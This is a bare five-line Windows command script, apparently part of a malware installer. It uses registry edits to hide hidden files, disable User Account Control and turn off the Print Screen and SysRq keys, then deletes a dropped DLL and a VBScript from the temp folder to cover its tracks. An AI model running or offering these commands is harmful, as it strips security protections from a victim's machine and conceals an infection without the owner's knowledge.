Reg Add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /V Hidden /T REG_DWORD /D 0 /F
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 000000000000000003000000000037e00000540000000000 /f
erase "C:\DOCUME~1\user\LOCALS~1\Temp\wpbt0.dll"
erase "C:\DOCUME~1\user\LOCALS~1\Temp\ex.vbs"
